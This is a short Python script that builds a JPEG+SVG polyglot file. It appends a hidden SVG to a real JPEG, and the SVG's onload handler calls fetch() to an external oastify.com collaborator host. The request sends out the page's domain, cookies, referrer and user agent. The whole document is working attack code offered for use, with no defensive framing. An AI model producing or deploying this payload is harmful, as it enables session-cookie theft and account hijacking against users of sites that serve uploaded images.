# Build a JPEG+SVG polyglot that exfiltrates browser context to your webhook
with open("legit.jpg", "rb") as f:
    jpeg_data = f.read()

svg_payload = b"""
<svg xmlns='http://www.w3.org/2000/svg' onload="
  fetch('https://86cosjinzx5k7pkcct4dm2ileck38uwj.oastify.com' +
    'domain=' + encodeURIComponent(document.domain) +
    '&cookie=' + encodeURIComponent(document.cookie) +
    '&ref=' + encodeURIComponent(document.referrer) +
    '&ua=' + encodeURIComponent(navigator.userAgent)
  )">
  <rect width='300' height='100' style='fill:blue'/>
</svg>
"""

with open("polyglot.jpg", "wb") as f:
    f.write(jpeg_data)
    f.write(b"\xFF\xD9")  # JPEG EOF marker
    f.write(svg_payload)

